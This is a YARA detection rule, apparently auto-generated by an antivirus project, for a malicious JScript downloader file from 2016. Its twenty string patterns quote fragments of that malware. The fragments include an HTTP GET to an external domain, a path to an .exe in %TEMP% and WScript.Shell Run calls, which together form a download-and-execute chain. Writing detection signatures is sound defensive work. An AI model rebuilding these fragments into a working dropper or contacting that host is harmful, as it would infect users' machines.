rule sig_20160328_23bbd1b2507ca350fc67fba35460b2f8 {
  meta:
    description = "datamaliciousorder - file 20160328_23bbd1b2507ca350fc67fba35460b2f8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f0e55f2ffa5e19240c4a6be9ee722544b034b337b8f1c3cf48cc67b5aed5ec3a"

  strings:
    $s1  = "function Xpzydomk() {return Jmjxv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Fqfbz2e4QB9.exe\";};" fullword ascii
    $s2  = "do {WScript[Kznsp](Xybrdgu() * 11)} while (Fbakkthc[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Fbakkthc[Dtxkn](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s4  = "function Szhbj(Zqapsdbe, Lowsbljeg){return Zqapsdbe - Lowsbljeg;};" fullword ascii
    $s5  = "var Jmjxv = function Pcavm() {return WScript[Excxauoc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Aeaem(Mviak){Jmjxv[\"Run\"](Mviak, Csdrhoqr, Csdrhoqr);};" fullword ascii
    $s7  = "function Mshcidruk() {return ((Oqfpkcd == true) && (Oqfpkcd == Wuvulsfqqq)) ? 1 : Csdrhoqr;};" fullword ascii
    $s8  = "function Dhctarcc(Gwojjvqf) {var Tvrzgjqeab = (1, 2, 3, 4, 5, Gwojjvqf); return Tvrzgjqeab;};" fullword ascii
    $s9  = "function Zowxcxq()" fullword ascii
    $s10 = "function Lmmlptvmwy(){return Hlool;};" fullword ascii
    $s11 = "var Wuvulsfqqq = false;" fullword ascii
    $s12 = " while (Idunyij){" fullword ascii
    $s13 = "var Oqfpkcd = false;" fullword ascii
    $s14 = "var Xnuntyh = false;" fullword ascii
    $s15 = "return Szhbj(Jicufgd, Wnzwdw);" fullword ascii
    $s16 = "function Xybrdgu(){return 22;};" fullword ascii
    $s17 = "Oqfpkcd = true; " fullword ascii
    $s18 = "var Idpkijwxnj = new this[\"Date\"]();" fullword ascii
    $s19 = "Wuvulsfqqq = true; " fullword ascii
    $s20 = "function Jsbjved(){return Excxauoc;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}